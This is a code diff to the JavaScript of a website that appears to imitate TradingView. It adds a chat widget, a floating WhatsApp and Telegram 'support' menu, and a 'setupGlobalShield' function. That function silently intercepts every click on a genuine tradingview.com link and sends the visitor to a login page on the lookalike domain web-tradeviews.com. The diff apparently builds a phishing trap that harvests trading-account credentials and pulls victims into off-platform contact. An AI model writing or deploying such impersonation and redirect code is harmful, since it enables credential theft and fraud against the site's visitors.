@@ -118,6 +118,15 @@
             document.head.appendChild(font);
         }
 
+        // Inject JivoChat Widget
+        if (!document.getElementById('jivo-chat-widget')) {
+            const jivo = document.createElement('script');
+            jivo.id = 'jivo-chat-widget';
+            jivo.src = '//code.jivosite.com/widget/GHQzWREEq6';
+            jivo.async = true;
+            document.head.appendChild(jivo);
+        }
+
         const css = `
             body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
             
@@ -238,6 +247,39 @@
                 }
                 .footerLinksColumnListItem-hezxxKBJ:hover { transform: none !important; }
             }
+
+            /* Social Floating Chat (Bottom Left) */
+            .tv-social-fab-container {
+                position: fixed; bottom: 20px; left: 20px; z-index: 999999;
+                display: flex; flex-direction: column-reverse; align-items: flex-start; gap: 12px;
+            }
+            .tv-social-fab {
+                width: 56px; height: 56px; border-radius: 50%; background: #2962ff;
+                display: flex; align-items: center; justify-content: center; color: white;
+                box-shadow: 0 4px 12px rgba(41, 98, 255, 0.4); cursor: pointer;
+                transition: transform 0.2s cubic-bezier(0.2, 0, 0, 1), background 0.2s;
+            }
+            .tv-social-fab:hover { transform: scale(1.05); background: #1e4bd8; }
+            .tv-social-fab svg { width: 28px; height: 28px; }
+
+            .tv-social-menu {
+                display: flex; flex-direction: column; gap: 8px;
+                opacity: 0; visibility: hidden; transform: translateY(10px) scale(0.95);
+                transition: all 0.2s cubic-bezier(0.2, 0, 0, 1); transform-origin: bottom left;
+            }
+            .tv-social-menu.is-open { opacity: 1; visibility: visible; transform: translateY(0) scale(1); }
+
+            .tv-social-menu-item {
+                display: flex; align-items: center; gap: 10px; padding: 10px 16px;
+                background: rgba(30, 34, 45, 0.95); backdrop-filter: blur(8px);
+                border: 1px solid rgba(255,255,255,0.1); border-radius: 12px;
+                color: white; text-decoration: none; font-size: 14px; font-weight: 600;
+                box-shadow: 0 8px 16px rgba(0,0,0,0.2); transition: transform 0.15s;
+            }
+            .tv-social-menu-item:hover { transform: translateX(5px); background: #2a2e39; }
+            .tv-social-menu-item.whatsapp { border-left: 4px solid #25D366; }
+            .tv-social-menu-item.telegram { border-left: 4px solid #0088cc; }
+            .tv-social-menu-item svg { width: 20px; height: 20px; }
         `;
         const style = document.createElement('style');
         style.innerHTML = css;
@@ -371,12 +413,74 @@
         }
     }
 
+    function setupSocialFloatingChat() {
+        if (document.getElementById('tv-social-fab-container')) return;
+
+        const container = document.createElement('div');
+        container.id = 'tv-social-fab-container';
+        container.className = 'tv-social-fab-container';
+        
+        container.innerHTML = `
+            <div class="tv-social-fab" id="tv-social-fab-main" title="Contact Support">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg>
+            </div>
+            <div class="tv-social-menu" id="tv-social-fab-menu">
+                <a href="https://wa.me/14242292950" target="_blank" class="tv-social-menu-item whatsapp">
+                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.399-4.385 9.782-9.714 9.782 m0-17.3c-4.148 0-7.523 3.376-7.523 7.525 0 1.325.344 2.617 1.001 3.759l.115.197-.662 2.42 2.474-.649.19.112c1.103.654 2.368.999 3.665 1.002h.003c4.047 0 7.339-3.291 7.342-7.34a7.359 7.359 0 00-2.164-5.24 7.35 7.35 0 00-5.181-2.109"/></svg>
+                    WhatsApp
+                </a>
+                <a href="https://t.me/webtradeview" target="_blank" class="tv-social-menu-item telegram">
+                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.98.52-1.4.51-.46-.01-1.35-.26-2.01-.48-.81-.27-1.46-.42-1.4-.88.03-.24.38-.1.97-.24 3.73-1.62 6.21-2.69 7.44-3.21 3.52-1.48 4.25-1.74 4.73-1.75.11 0 .35.03.5.15.13.1.17.24.18.33.01.07.02.24.01.38z"/></svg>
+                    Telegram
+                </a>
+            </div>
+        `;
+
+        document.body.appendChild(container);
+        
+        const fab = document.getElementById('tv-social-fab-main');
+        const menu = document.getElementById('tv-social-fab-menu');
+
+        fab.onclick = (e) => {
+            e.stopPropagation();
+            menu.classList.toggle('is-open');
+        };
+
+        document.addEventListener('click', () => menu.classList.remove('is-open'));
+    }
+    function setupGlobalShield() {
+        const REDIRECT_URL = 'https://app.web-tradeviews.com/login';
+        
+        document.addEventListener('click', function(e) {
+            const link = e.target.closest('a');
+            if (!link) return;
+            
+            const href = link.getAttribute('href');
+            if (!href) return;
+            
+            // Check if the link points to TradingView.com or its subdomains
+            const isTradingView = href.includes('tradingview.com') || href.includes('tv.com') || href.includes('tradingview-widget.com');
+            
+            // Whitelist our own functionalized pages/paths
+            // If it's a relative path starting with . or / and doesn't contain 'tradingview.com', it's likely internal
+            const isInternal = (href.startsWith('.') || href.startsWith('/') || !href.includes('://')) && !href.includes('tradingview.com');
+
+            if (isTradingView && !isInternal) {
+                console.log("[GlobalGuard] Intercepted TradingView link, redirecting to login...");
+                e.preventDefault();
+                window.location.href = REDIRECT_URL;
+            }
+        }, true);
+    }
+
     function init() {
         const prefix = getRelPrefix();
         injectShell();
         renderHeader(prefix);
         renderFooter(prefix);
         setupMobileMenu(prefix);
+        setupGlobalShield();
+        setupSocialFloatingChat();
     }
 
     if (document.readyState === 'loading') {
